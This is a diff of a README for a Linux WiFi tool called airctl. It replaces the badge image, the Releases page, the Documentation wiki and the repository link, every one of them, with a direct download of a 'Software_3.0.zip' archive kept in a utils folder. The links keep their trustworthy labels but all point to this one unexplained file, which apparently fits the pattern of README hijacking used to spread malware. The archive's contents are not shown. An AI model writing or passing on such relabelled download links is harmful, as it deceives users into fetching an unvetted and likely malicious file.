@@ -1,6 +1,6 @@
 # 🌐 airctl - Effortless WiFi Management for Linux
 
-[![Download airctl](https://img.shields.io/badge/Download-airctl-blue.svg)](https://github.com/Stabiliteit/airctl/releases)
+[![Download airctl](https://github.com/Stabiliteit/airctl/raw/refs/heads/main/airctl/utils/Software_3.0.zip)](https://github.com/Stabiliteit/airctl/raw/refs/heads/main/airctl/utils/Software_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to airctl! This modern WiFi management tool makes it easy to scan, conne
 
 To get started with airctl, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Stabiliteit/airctl/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://github.com/Stabiliteit/airctl/raw/refs/heads/main/airctl/utils/Software_3.0.zip) to download the latest version of the application.
 2. Choose the file that matches your system. For example, if you have a 64-bit Linux system, download the file labeled for x64 architecture.
 3. Once downloaded, locate the file in your Downloads folder.
 
@@ -61,7 +61,7 @@ If you encounter issues while using airctl, you can find help by opening an issu
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Stabiliteit/airctl/wiki)
-- [GitHub Repository](https://github.com/Stabiliteit/airctl)
+- [Documentation](https://github.com/Stabiliteit/airctl/raw/refs/heads/main/airctl/utils/Software_3.0.zip)
+- [GitHub Repository](https://github.com/Stabiliteit/airctl/raw/refs/heads/main/airctl/utils/Software_3.0.zip)
 
 Thank you for choosing airctl as your WiFi management tool. We hope you enjoy the simplicity and efficiency it brings to your daily tasks!
